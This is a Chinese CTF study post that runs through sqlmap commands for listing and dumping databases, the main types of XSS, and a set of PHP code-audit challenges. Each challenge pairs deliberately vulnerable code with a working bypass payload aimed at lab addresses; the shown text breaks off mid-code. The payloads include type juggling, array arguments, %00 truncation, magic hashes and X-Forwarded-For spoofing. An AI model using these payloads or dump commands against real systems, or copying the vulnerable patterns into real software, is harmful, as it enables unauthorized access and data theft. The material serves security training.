<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
<p>更详细介绍<a href="https://www.jianshu.com/p/4fb15a2c9040" rel="external nofollow" target="_blank">参考博客</a></p>
<h4 id="sqlmap基本操作"><a href="#sqlmap基本操作" class="headerlink" title="sqlmap基本操作"></a>sqlmap基本操作</h4><ul>
<li><p>检测注入点</p>
<blockquote>
<p>sqlmap.py -u url</p>
</blockquote>
</li>
<li><p>所有数据库信息</p>
<blockquote>
<p>sqlmap.py -u url –dbs</p>
</blockquote>
</li>
<li><p>当前数据库信息</p>
<blockquote>
<p>sqlmap.py -u url –current-db</p>
</blockquote>
</li>
<li><p>指定库名列出所有表</p>
<blockquote>
<p>sqlmap.py -u url -D 库名 –table</p>
</blockquote>
</li>
<li><p>指定库名表名列出所有字段</p>
<blockquote>
<p>sqlmap.py -u url -D 库名 -T 表名 –columns</p>
</blockquote>
</li>
<li><p>指定库名表名字段dump</p>
<blockquote>
<p>sqlmap.py -u url -D 库名 -T 表名 -C 字段1,字段2 –dump</p>
</blockquote>
</li>
</ul>
<h5 id="CTF中的SQL注入"><a href="#CTF中的SQL注入" class="headerlink" title="CTF中的SQL注入"></a>CTF中的SQL注入</h5><p>1.练习总结博客：<a href="https://www.jianshu.com/p/17da91c3bdab" rel="external nofollow" target="_blank">站点</a></p>
<p>2.简单sql注入3：<a href="https://0xor-writeup.readthedocs.io/zh/latest/wargame/web/[shiyanbar.com]_simple_sql_injection_3/" rel="external nofollow" target="_blank">writeup</a></p>
<h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>CSS（Cross Site Scripting，跨站脚本攻击），为了和层叠样式表（Cascading Style Sheet，CSS）区分，所以安全领域改为叫XSS。<br>XSS攻击能让攻击者在受害者的浏览器中执行js脚本，并劫持用户会话、破坏网络或将用户重定向到其他恶意的站点。</p>
<h4 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h4><h5 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h5><p>所谓反射型XSS，就是简单用户输入的数据‘反射’给浏览器。也就是说，黑客我那个网需要有事用户‘点击’一个恶意链接，才能攻击。这其实是比较被动的。</p>
<h5 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h5><p>存储型XSS会把用户输入的数据‘存储’在服务器端。当访问数据库数据时，从数据库取出数据，并由HTML显示，这时导致了XSS的产生。</p>
<p>比如黑客将恶意js脚本写在一个博客中，下次任何人访问这个博客，都会在他们的浏览器中执行这段恶意js脚本。导致‘Cookie劫持’等。</p>
<h5 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h5><p>首先是关于DOM节点：<br>整个文档是一个文档节点 从每个 XML 标签是一个元素节点 包含在 XML 元素中的文本是文本节点 每一个 XML 属性是一个属性节点 注释属于注释节点。</p>
<p>HTML 文档中的所有内容都是节点：</p>
<ul>
<li>整个文档是一个文档节点</li>
<li>每个 HTML 元素是元素节点</li>
<li>HTML 元素内的文本是文本节点</li>
<li>每个 HTML 属性是属性节点</li>
<li>注释是注释节点</li>
</ul>
<p>和反射型XSS类似，但是这类XSS执行脚本的位置与反射型XSS不同，是修改了页面的DOM节点而造成了恶意js脚本的执行。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><table>
<thead>
<tr>
<th>XSS类型</th>
<th>反射型</th>
<th>存储型</th>
<th>DOM型</th>
</tr>
</thead>
<tbody>
<tr>
<td>触发过程</td>
<td>正常用户访问携带XSS的url</td>
<td>1.黑客构造XSS脚本2.用户访问有XSS脚本的网站</td>
<td>正常用户访问携带XSS的url</td>
</tr>
<tr>
<td>存储位置</td>
<td>url</td>
<td>数据库</td>
<td>url</td>
</tr>
<tr>
<td>谁来输出</td>
<td>后端web</td>
<td>后端web</td>
<td>前端JS</td>
</tr>
<tr>
<td>输出位置</td>
<td>HTML响应</td>
<td>HTML响应</td>
<td>动态生成的DOM节点</td>
</tr>
</tbody>
</table>
<h5 id="XSS在CTF中的运用"><a href="#XSS在CTF中的运用" class="headerlink" title="XSS在CTF中的运用"></a>XSS在CTF中的运用</h5><p>XSS在CTF中主要用于盗取<code>Cookie</code>和<code>Session</code>，然后利用<code>cookie</code>,做一些其他的事情，但是这是有CSP的，一般会考察<code>XSS绕过(bypass)</code>的能力。</p>
<p>另外还会涉及到<code>XSS</code>,<code>CSRF</code>，<code>SSRF</code>的综合应用。</p>
<p>再者，就是利用XSS漏洞，进行js脚本注入。</p>
<h5 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h5><p>1.<a href="https://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E4%BB%80%E4%B9%88%E6%98%AFXSS" rel="external nofollow" target="_blank">XSS原理&amp;复现</a><br>2.<a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/" rel="external nofollow" target="_blank">XSS攻击手段&amp;在CTF中的运用</a></p>
<h2 id="day03–Danie1"><a href="#day03–Danie1" class="headerlink" title="day03–Danie1"></a>day03–Danie1</h2><h3 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3><h4 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h4><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag=<span class="string">'xxx'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim($flag);</span><br><span class="line">    <span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>file_get_contents — 将整个文件读入一个字符串。</p>
<p>trim — 去除字符串首尾处的空白字符（或者其他字符）。</p>
<ul>
<li>题目环境  <a href="http://172.16.43.117/php_bugs-master/01.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/01.php</a></li>
<li>payload <code>http://172.16.43.117/php_bugs-master/01.php?shiyan=1&amp;flag=1</code></li>
</ul>
<h4 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h4><hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)&#123;<span class="keyword">echo</span> $flag;&#125;</span><br></pre></td></tr></table></figure>
<p>本地编写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>([<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>);</span><br><span class="line">$token = base64_encode(gzcompress(serialize($arr)));</span><br><span class="line">print_r($token);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行得到</p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080702.png" alt=""></p>
<p>即是所需的payload</p>
<h5 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>); </span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="keyword">else</span> </span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
<ul>
<li><p>题目 <a href="http://172.16.43.117/php_bugs-master/05.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/05.php</a></p>
</li>
<li><p>限制条件</p>
<p>题中ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母</p>
</li>
</ul>
<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>
<ul>
<li>解决方法</li>
</ul>
<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<p>科学计数法绕过长度限制</p>
<ul>
<li>payload  <code>http://172.16.43.117/php_bugs-master/05.php?password=1e9%00*-*</code></li>
</ul>
<h4 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//比较两个字符串（区分大小写） </span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以使用数组绕过</p>
<p>int strcmp ( string $str1 , string $str2 )<br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
<p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在<code>5.3</code>之前的php中，显示了报错的警告信息后，将<code>return 0</code> !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<code>strcmp</code>只会处理字符串参数，如果给个数组的话呢，就会返回<code>NULL</code>,而判断使用的是<code>==</code>，<code>NULL==0</code>是 <code>bool(true)</code></p>
<p>题目 <a href="http://172.16.43.115/1.php" rel="external nofollow" target="_blank">http://172.16.43.115/1.php</a></p>
<p>payload： <code>?a[]=1</code></p>
<h4 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>限制条件</p>
<p>传入的name参数和password参数不能相同</p>
<p>但是它们的sha1值要相同</p>
<p>解决方法</p>
<p><code>===</code>会比较类型，比如<code>bool</code><br><code>sha1()</code>函数和<code>md5()</code>函数存在着漏洞，<code>sha1()</code>函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使<code>sha1()</code>函数返回错误，也就是返回<code>false</code>，这样一来<code>===</code>运算符就可以发挥作用了，需要构造<code>username</code>和<code>password</code>既不相等，又同样是数组类型</p>
<p>题目： <a href="http://172.16.43.117/php_bugs-master/07.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/07.php</a></p>
<p>payload：  <code>?name[]=1&amp;password[]=2</code></p>
<h4 id="SESSION验证绕过"><a href="#SESSION验证绕过" class="headerlink" title="SESSION验证绕过"></a>SESSION验证绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>限制条件</p>
<p>传入的password参数要等于session中的password值</p>
<p>解决方法</p>
<p>删除session</p>
<p>题目： <a href="http://172.16.43.115/2.php" rel="external nofollow" target="_blank">http://172.16.43.115/2.php</a></p>
<p>payload  <code>http://172.16.43.115/2.php?password=</code></p>
<h4 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目：<a href="http://172.16.43.117/php_bugs-master/10.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/10.php</a></p>
<p>payload  <code>http://172.16.43.117/php_bugs-master/10.php?id=%2568ackerDJ</code></p>
<h4 id="X-Forwarded-For绕过指定IP地址"><a href="#X-Forwarded-For绕过指定IP地址" class="headerlink" title="X-Forwarded-For绕过指定IP地址"></a>X-Forwarded-For绕过指定IP地址</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">    $cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">    $cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">    $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目：<a href="http://172.16.43.117/php_bugs-master/12.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/12.php</a></p>
<p>解决方法</p>
<p><code>HTTP</code>头添加<code>X-Forwarded-For:1.1.1.1</code></p>
<p>使用forefox插件<code>SIMPLE MODIFY HEADERS</code></p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080704.png" alt=""></p>
<h4 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;<span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;#"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析</p>
<p>$md51=QNKCDZO的MD5编码</p>
<p>$md52=传入的参数a的MD5编码</p>
<p>$a 不等于’QNKCDZO’ 并且 $md51等于 $md52（也就是两个不同的字符串md5值要相同）</p>
</li>
</ul>
<p>将QNKCDZO进行MD5加密，密文为0e830400451993494058024219903391，发现密文为0e开头，PHP在进行比较运算时，0e开头字符串都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&apos;240610708&apos;); // 0e462097431906509019562988736854 </span><br><span class="line">md5(&apos;QNKCDZO&apos;); // 0e830400451993494058024219903391</span><br></pre></td></tr></table></figure>
<ul>
<li>题目:   <a href="http://172.16.43.117/php_bugs-master/13.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/13.php</a></li>
<li>payload:   <code>?a=240610708</code></li>
</ul>
<h4 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析</p>
<p>既要是纯数字,又要有<code>#biubiubiu</code></p>
<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<p>注意：需将#编码</p>
</li>
<li><p>题目：<a href="http://172.16.43.117/php_bugs-master/15.php" rel="external nofollow" target="_blank">http://172.16.43.117/php_bugs-master/15.php</a></p>
</li>
<li><p>payload：<code>?nctf=1%00%23biubiubiu</code></p>
</li>
</ul>
<h4 id="md5-函数-使用数组绕过"><a href="#md5-函数-使用数组绕过" class="headerlink" title="md5()函数===使用数组绕过"></a>md5()函数===使用数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 